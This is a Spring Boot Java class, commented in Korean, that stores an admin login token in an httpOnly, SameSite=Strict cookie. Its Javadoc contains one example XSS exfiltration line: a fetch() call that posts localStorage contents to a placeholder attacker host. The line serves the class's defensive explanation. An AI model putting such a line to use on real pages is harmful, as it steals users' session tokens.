package com.kiosk.global.security;

import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import java.time.Duration;
import java.util.Arrays;
import java.util.Optional;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.http.HttpHeaders;
import org.springframework.http.ResponseCookie;
import org.springframework.stereotype.Component;

/**
 * 로그인 토큰을 담는 httpOnly 쿠키. 예전에는 응답 본문에 토큰을 실어주고 프론트가
 * localStorage에 저장했는데, 그 위치는 JS가 그냥 읽을 수 있어서 XSS가 한 번이라도 터지면
 * {@code fetch('공격자', {body: localStorage.getItem(...)})} 한 줄로 토큰이 통째로 유출된다.
 *
 * <p>httpOnly 쿠키는 브라우저가 JS의 접근 자체를 막고, 요청할 때만 자동으로 실어 보낸다 -
 * "쓸 수는 있지만 볼 수는 없는" 상태가 되어 탈취해 나갈 수단이 사라진다.
 */
@Component
public class AuthCookie {

    public static final String NAME = "admin_session";

    // 쿠키 수명은 토큰 유효기간(AdminTokenService.VALID_DURATION)과 맞춘다. 더 길면 브라우저에
    // 죽은 쿠키가 남아 매 요청 401을 맞고, 더 짧으면 토큰이 살아있는데 로그아웃된 것처럼 보인다.
    private static final Duration MAX_AGE = Duration.ofHours(12);

    // 운영에 HTTPS(ALB/CloudFront 등)가 붙으면 COOKIE_SECURE=true로 켠다. 지금은 nginx가 80만
    // 열려 있어서 true로 두면 브라우저가 쿠키를 아예 보내지 않아 로그인이 통째로 막힌다.
    private final boolean secure;

    public AuthCookie(@Value("${app.cookie-secure:false}") boolean secure) {
        this.secure = secure;
    }

    public void set(HttpServletResponse response, String token) {
        response.addHeader(HttpHeaders.SET_COOKIE, build(token, MAX_AGE));
    }

    /** maxAge=0인 같은 이름의 쿠키를 덮어써서 브라우저가 즉시 지우게 한다. */
    public void clear(HttpServletResponse response) {
        response.addHeader(HttpHeaders.SET_COOKIE, build("", Duration.ZERO));
    }

    public static Optional<String> read(HttpServletRequest request) {
        if (request.getCookies() == null) return Optional.empty();
        return Arrays.stream(request.getCookies())
                .filter(cookie -> NAME.equals(cookie.getName()))
                .map(jakarta.servlet.http.Cookie::getValue)
                .filter(value -> !value.isBlank())
                .findFirst();
    }

    private String build(String value, Duration maxAge) {
        return ResponseCookie.from(NAME, value)
                // JS가 document.cookie로 읽을 수 없게 한다 - 이 설정 하나가 이 클래스의 존재 이유다.
                .httpOnly(true)
                // 쿠키는 브라우저가 자동으로 보내므로 남의 사이트에서 우리 API를 부르면 같이 실린다(CSRF).
                // 프론트와 API가 같은 출처(nginx가 /api를 프록시)라 Strict로 잠가도 정상 동작한다.
                .sameSite("Strict")
                .secure(secure)
                .path("/")
                .maxAge(maxAge)
                .build()
                .toString();
    }
}
